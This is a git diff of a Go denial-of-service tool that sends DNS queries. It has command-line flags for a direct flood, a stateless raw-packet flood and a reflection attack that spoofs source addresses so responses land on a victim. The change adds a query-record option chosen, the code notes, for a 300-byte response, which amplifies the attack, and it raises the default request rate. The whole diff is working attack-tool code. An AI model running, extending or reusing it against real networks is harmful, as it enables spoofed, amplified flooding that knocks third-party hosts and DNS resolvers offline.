@@ -9,22 +9,23 @@ import (
 	"time"
 
 	"github.com/miekg/dns"
+
 	"lib/channels/chanman"
 	"lib/config"
 	"lib/protocols/dnsproto"
 	"lib/protocols/dnsproto/dnsraw"
-	//"code.google.com/p/go.net/ipv4"
 )
 
-var protoFlag = flag.String("p", "dns", "Specify protocol to use for DoS (dns)") //specify which protocol to use, only dns for now
-var destPort = flag.Uint("P", 53, "Specify destination port for DoS")            //specify the destinaton port to use, 53 is the default
-var destIPs = flag.String("d", "127.0.0.1", "Specify an single host or a list of destination hosts seperated by comma (example: 1.2.3.4 or 1.2.3.4,2.3.4.5)")
-var srcIPs = flag.String("s", "127.0.0.1", "Specify an single host or a list of source hosts seperated by comma (example: 1.2.3.4 or 1.2.3.4,2.3.4.5), only used for reflection attacks")
-var rateFlag = flag.Uint("r", 1, "Specify the amount of protocol requests per second")
-var durationFlag = flag.Uint("D", 60, "Specify the total duration of the test")
-var interfaceFlag = flag.String("i", "eth0", "Specify which interface name to eject packets from (raw packets only)")
-var floodFlag = flag.Bool("F", false, "Specifies if the dns request should be flooded statelessly")
-var reflectionFlag = flag.Bool("R", false, "If set to true the specified then specify the source IPs to spoof the requests from. In this case the source IPs are destination IPs and the destination is the source.")
+var protoFlag = flag.String("p", "dns", "Specify protocol to use for DoS (default: dns)") //specify which protocol to use, only dns for now
+var destPort = flag.Uint("P", 53, "Specify destination port for DoS. (default: 53)")      //specify the destinaton port to use, 53 is the default
+var destIPs = flag.String("d", "127.0.0.1", "Specify an single host or a list of destination hosts seperated by comma (example: 1.2.3.4 or 1.2.3.4,2.3.4.5) (default: 127.0.0.1)")
+var srcIPs = flag.String("s", "127.0.0.1", "Specify an single host or a list of source hosts seperated by comma (example: 1.2.3.4 or 1.2.3.4,2.3.4.5), only used for flood or reflection attacks. (default: 127.0.0.1)")
+var rateFlag = flag.Uint("r", 5, "Specify the amount of protocol requests per second. (default: 5)")
+var queryRecord = flag.String("q", "time.apple.com", "Specify the host to query for. The default offers a 300 byte response. (default: time.apple.com)")
+var durationFlag = flag.Uint("D", 60, "Specify the total duration of the test (default: 60 seconds)")
+var interfaceFlag = flag.String("i", "eth0", "Specify which interface name to eject packets from (default: eth0)")
+var floodFlag = flag.Bool("F", false, "Specifies if the dns request should be flooded statelessly from the host running the tool. (default: false)")
+var reflectionFlag = flag.Bool("R", false, "If set to true the specified then specify the source IPs to spoof the requests from. In this case the source IPs are destination IPs and the destination is the source. (default: false)")
 
 func main() {
 	//Set the runtime to the max number of available CPUs
@@ -90,12 +91,18 @@ func main() {
 		//take interface string and specify the correct index
 		cfg.SetInterfaceByName(*interfaceFlag)
 	} else {
-		log.Fatalf("The egress interface was not specified")
+		log.Fatalf("The egress interface was not specified\n")
+	}
+
+	if queryRecord != nil {
+		cfg.SetQuery(*queryRecord)
+	} else {
+		log.Fatalf("Error setting the record to query for %s\n", queryRecord)
 	}
 
 	//configure startup for test
 
-	log.Printf("Starting DoS against %s on Port %d via protocol %s at rate %d/s", *destIPs, *destPort, *protoFlag, *rateFlag)
+	log.Printf("Starting DoS against %s on Port %d via protocol %s at rate %d/s\n", *destIPs, *destPort, *protoFlag, *rateFlag)
 
 	ticker := time.NewTicker(time.Second * 1)
 
@@ -133,7 +140,7 @@ func main() {
 			var i uint
 			for i = 0; i < cfg.Rate; i++ {
 				wg.Add(1)
-				go dnsproto.DnsQuery(wg, config, cm)
+				go dnsproto.DnsQuery(cfg.Query, wg, config, cm)
 			}
 			if runCounter == *durationFlag {
 				wg.Wait()
@@ -148,12 +155,11 @@ func main() {
 			var i uint
 			for i = 0; i < cfg.Rate; i++ {
 				wg.Add(1)
-				//send flood packet
 				rawQuery := dnsraw.NewRawDNS()
 				rawQuery.SetLocalAddress(cfg.SrcIPs[0])
 				rawQuery.SetRemoteAddress(cfg.DstIPs[0])
 				rawQuery.SetDestPort(cfg.DstPort)
-				go rawQuery.DnsQuery(wg, cfg.Interface.Index, cm)
+				go rawQuery.DnsQuery(wg, cfg, cm)
 			}
 			if runCounter == *durationFlag {
 				wg.Wait()
@@ -169,12 +175,11 @@ func main() {
 			var i uint
 			for i = 0; i < cfg.Rate; i++ {
 				wg.Add(1)
-				//send flood packet
 				rawQuery := dnsraw.NewRawDNS()
 				rawQuery.SetLocalAddress(cfg.DstIPs[0])
 				rawQuery.SetRemoteAddress(cfg.SrcIPs[0])
 				rawQuery.SetDestPort(cfg.DstPort)
-				go rawQuery.DnsQuery(wg, cfg.Interface.Index, cm)
+				go rawQuery.DnsQuery(wg, cfg, cm)
 			}
 			if runCounter == *durationFlag {
 				wg.Wait()
